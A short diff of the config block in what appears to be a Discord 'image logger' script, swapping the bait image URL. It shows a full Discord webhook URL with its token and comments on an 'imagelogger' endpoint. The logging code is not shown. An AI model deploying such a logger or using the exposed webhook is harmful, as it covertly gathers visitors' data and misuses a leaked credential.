@@ -13,7 +13,7 @@ __author__ = "imnotexploi4"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1372527871213441035/L25MKZEsjIcuxQ_LC0Z2d-wrETDN4qRUwiKo1zzZ8uMTMpaU3nDEkpHhV99wabIwDf80",
-    "image": "https://tr.rbxcdn.com/30DAY-Avatar-B932AFE9321FF300D05F45F1A9188792-Png/352/352/Avatar/Webp/noFilter", # You can also have a custom image by using a URL argument
+    "image": "https://iili.io/34sQHPI.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
